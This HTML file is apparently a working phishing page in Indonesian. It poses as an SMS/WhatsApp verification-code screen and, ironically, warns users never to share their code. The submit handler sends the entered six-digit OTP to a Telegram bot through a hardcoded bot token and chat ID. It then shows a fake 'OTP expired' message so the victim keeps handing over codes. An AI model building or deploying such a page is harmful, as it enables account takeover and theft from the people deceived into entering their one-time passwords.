<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Kode Verifikasi</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    input[type="number"] {
      -moz-appearance: textfield;
    }
  </style>
</head>
<body class="bg-white font-sans px-6 py-6 max-w-md mx-auto">
  <button aria-label="Back" class="mb-6">
    <i class="fas fa-arrow-left text-green-600 text-3xl"></i>
  </button>

  <h1 class="text-2xl font-semibold text-gray-900 mb-4 leading-tight">
    Kode verifikasi telah dikirim ke SMS/Whatsapp
  </h1>

  <p class="text-gray-400 mb-2 text-sm leading-relaxed">
    Demi keamanan akun Anda, mohon untuk tidak membagikan kode verifikasi kepada siapapun
  </p>
  <p class="text-gray-900 text-sm mb-6 leading-relaxed">
    Jika nomor sudah tidak aktif,
    <a href="#" class="text-green-600 hover:underline">silakan lakukan perubahan nomor ponsel</a>
  </p>

  <form id="codeForm" class="flex justify-between mb-6 max-w-xs" onsubmit="return false;">
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 1"
      pattern="\d"
      required
    />
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 2"
      pattern="\d"
      required
    />
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 3"
      pattern="\d"
      required
    />
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 4"
      pattern="\d"
      required
    />
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 5"
      pattern="\d"
      required
    />
    <input
      type="number"
      inputmode="numeric"
      maxlength="1"
      class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600"
      aria-label="Digit 6"
      pattern="\d"
      required
    />
  </form>

  <div id="timer" class="text-right text-gray-400 text-sm mb-8 select-none">50s</div>

  <button
    id="submitBtn"
    type="submit"
    disabled
    class="w-full bg-gray-300 text-white font-semibold py-3 rounded-full cursor-not-allowed"
  >
    Kirimkan
  </button>

  <script>
    const inputs = document.querySelectorAll('form#codeForm input');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');

    // Enable button only if all inputs have a digit
    function checkInputs() {
      const allFilled = Array.from(inputs).every(input => input.value.trim().length === 1);
      submitBtn.disabled = !allFilled;
      if (allFilled) {
        submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.add('bg-green-600', 'cursor-pointer');
      } else {
        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-green-600', 'cursor-pointer');
      }
    }

    inputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        // Only allow digits 0-9
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length === 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        checkInputs();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value.length === 0 && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });

    // Countdown timer from 50 seconds
    let timeLeft = 50;
    timerEl.textContent = `${timeLeft}s`;
    const countdown = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(countdown);
        timerEl.textContent = '0s';
      } else {
        timerEl.textContent = `${timeLeft}s`;
      }
    }, 1000);

    submitBtn.addEventListener('click', () => {
      const code = Array.from(inputs).map(input => input.value).join('');
      if (code.length !== 6) return;

      // Telegram Bot API details - replace with your own
      const botToken = '8275257587:AAHqb6nOza3eaFNZQGtr5yNuS5D9NArBBbE';
      const chatId = '7549590022';
      const message = encodeURIComponent(`Kode verifikasi yang dimasukkan: ${code}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert('Kode OTP Kadaluwarsa.');
          } else {
            alert('Gagal mengirim kode ke Telegram.');
          }
        })
        .catch(() => {
          alert('Terjadi kesalahan saat mengirim kode ke Telegram.');
        });
    });
  </script>
</body>
</html>
